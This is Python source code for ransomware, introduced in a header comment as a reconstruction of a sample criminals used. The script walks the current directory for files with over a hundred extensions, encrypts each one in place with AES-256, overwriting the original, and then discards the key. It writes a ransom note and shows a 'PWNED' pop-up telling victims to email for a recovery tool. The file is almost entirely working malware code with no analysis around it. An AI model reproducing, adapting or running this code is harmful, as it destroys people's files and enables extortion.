# ========================================================================= #
# This is a variation that criminals used to infect victims a week ago.
# I got a sample, and although I didn't recover the original file, I believe
# I reconstructed it as closely as possible.
# ========================================================================= #
import os
import gc
import sys
import base64
import secrets
import hashlib
import platform
import webbrowser
from tkinter import *
from pathlib import Path
from random import randint
from tkinter import messagebox
try:
    from AesEverywhere import aes256
except:
    os.system("pip3 install aes-everywhere")
    from AesEverywhere import aes256
# ========================================================================= #
# Try to initialize on home:
# ========================================================================= #
if False:
    try:
        os.chdir(str(Path.home()))
    except Exception as error:
        print(error)

# ========================================================================= #
# Node Setup:
# ========================================================================= #
node_sig = secrets.token_urlsafe(16)
node_key = hashlib.blake2s(str(node_sig + "qv1m3r4").encode()).hexdigest()[24:48][::-1]
node_key_hash = hashlib.blake2s(node_key.encode()).hexdigest()

# ========================================================================= #
# General Setup:
# ========================================================================= #
class Tool:
    def __init__(self):
        self.files_found = []
        self.targets = ["txt", "pdf", "odt", "xls", "png", "jpg", "jpeg", "html",
                        "epub", "mp3", "gif", "doc", "odp", "ods", "json", "xml",
                        "mp4", "avi", "md", "ogg", "m4a", "ini", "c", "cpp", "jar",
                        "rb", "java", "pl", "apk", "raw", "eml", "msg", "tmp", "js",
                        "conf", "config", "yaml", "asm", "h", "r", "m", "luac", "dat",
                        "sasf", "lua", "src", "perl", "c#", "go", "smali", "csproj",
                        "bash", "sh", "asic", "run", "vb", "vbe", "kt", "lsp", "vba",
                        "nt", "geojson", "c++", "ps1", "dev", "mk", "owl", "scala", "php",
                        "odl", "rar", "bak", "bkp", "iso", "zip", "7z", "sbf", "old", "meta",
                        "psw", "bkf", "fbk", "xar", "moz-backup", "orig", "new", "001", "bps",
                        "img", "deleted", "eg", "ren", "undo", "ofb", "da1", "sql", "bak1", "gcb",
                        "in1", "och", "exclude", "data", "$$$", "000", "bac", "arc", "assets",
                        "resource", "resS", "info", "dll", "vdx", "cache", "csv"]
tool = Tool()

# ========================================================================= #
# Search Files:
# ========================================================================= #
for dirpath, dirs, files in os.walk(os.getcwd()):
    for f in files:
        path = os.path.abspath(os.path.join(dirpath, f))
        f_extension = path.split('.')[-1]
        if f_extension in tool.targets:
            tool.files_found.append(path)

# ========================================================================= #
# Save Progress:
# ========================================================================= #
with open("egg_{0}.txt".format(node_sig), "w") as fl:
    fl.write("You have been pwned by QV1M3R4.\n")
    fl.write("Send a messa to our@email.com to get your recovery tool.\n\n")
    fl.write("Node Signature: {0}\n".format(node_sig))
    fl.write("{0} File(s) affected:\n\n".format(len(tool.files_found)))
    for file in tool.files_found:
        fl.write(file + "\n")

# ========================================================================= #
# Encrypt:
# ========================================================================= #
for f in tool.files_found:
    try:
        # Ignore this file and progress log:
        if f != sys.argv[0] and f != "egg_{0}.txt".format(node_sig):
            # Read original data and encrypt:
            with open(f, "rb") as fl:
                data = fl.read()
            encoded_data = base64.b64encode(data)
            tmp_key = node_key[::-1] + f[::-1]
            encrypted_data = aes256.encrypt(encoded_data.decode(), tmp_key)
            # Overwrite data:
            with open(f, "wb") as fl:
                fl.write(encrypted_data)
    except Exception as error:
        print(error)
# All files encrypted? Delete key from memory:
del node_key
gc.collect()

# ========================================================================= #
# GUI:
# ========================================================================= #
messagebox.showwarning(title="PWNED by QV1M3R4!",
message="""QV1M3R4 has pwned you! {0} file(s) are now encrypted!

Send a message to our@email.com to get your recovery tool.

Node Signature: {1}""".format(len(tool.files_found), node_sig))
# Show contents:
webbrowser.open("file://{0}/egg_{1}.txt".format(os.getcwd(), node_sig), new=2)
